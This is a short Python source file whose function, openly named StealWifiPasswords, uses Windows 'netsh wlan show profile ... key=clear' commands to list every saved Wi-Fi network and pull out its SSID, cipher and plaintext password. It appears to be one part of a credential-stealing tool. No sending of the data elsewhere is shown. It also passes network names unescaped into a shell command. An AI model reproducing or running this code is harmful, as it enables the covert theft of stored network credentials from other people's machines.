
# Import modules
import re 
import subprocess


""" Get wifi auth credentials """
def StealWifiPasswords():
    result = []
    chcp = "chcp 65001 && "
    # Fetch all networks
    networks = subprocess.check_output(f"{chcp}netsh wlan show profile", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
    networks = networks.decode(encoding="utf8", errors="strict")
    network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks) 
    # For all found networks
    for network_name in network_names_list:
        current_result = subprocess.check_output(f"{chcp}netsh wlan show profile {network_name} key=clear", shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        current_result = current_result.decode(encoding="utf8", errors="strict")        
        # Fetch wifi credentials
        ssid = re.findall("(?:SSID name\s*:\s)(.*)", str(current_result))[0].replace("\r", '').replace("\"", '')
        authentication = re.findall(r"(?:Authentication\s*:\s)(.*)", current_result)[0].replace("\r", '')
        cipher = re.findall("(?:Cipher\s*:\s)(.*)", current_result)[0].replace("\r", '')
        security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)[0].replace("\r", '')
        password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)[0].replace("\r", '')
        # Save
        wifi = {
            "SSID": ssid,
            "AUTH": authentication,
            "CIPHER": cipher,
            "SECURITY_KEY": security_key,
            "PASSWORD": password
        }
        result.append(wifi)

    return result
                